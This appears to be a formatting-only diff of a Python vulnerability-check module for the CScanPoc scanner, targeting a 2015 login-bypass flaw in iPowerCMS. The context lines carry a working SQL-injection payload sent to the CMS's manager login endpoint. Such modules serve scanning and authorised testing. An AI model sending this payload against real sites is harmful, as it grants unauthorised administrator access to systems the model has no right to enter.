@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import time
 
+
 class Vuln(ABVuln):
-    vuln_id = 'iPowerCMS_0001' # 平台漏洞编号，留空
+    vuln_id = 'iPowerCMS_0001'  # 平台漏洞编号，留空
     name = '鼎维iPowerCMS建站CMS 万能密码'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.OTHER # 漏洞类型
+    type = VulnType.OTHER  # 漏洞类型
     disclosure_date = '2015-04-28'  # 漏洞公布时间
     desc = '''
         鼎维iPowerCMS建站CMS存在两处高危漏洞：建站弱口令、万能密码。
@@ -18,6 +19,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'iPowerCMS'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = 'f887725f-44e6-4f87-ada9-21041c904dde'
@@ -31,8 +33,8 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #Refer http://www.wooyun.org/bugs/wooyun-2010-0110152
+
+            # Refer http://www.wooyun.org/bugs/wooyun-2010-0110152
             hh = hackhttp.hackhttp()
             payload = '/m/manager/login.xml.php?username=admin\'%20or%20\'a\'=\'a&password=123&vcode='
             code, head, res, errcode, _ = hh.http(self.target + payload)
@@ -47,6 +49,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
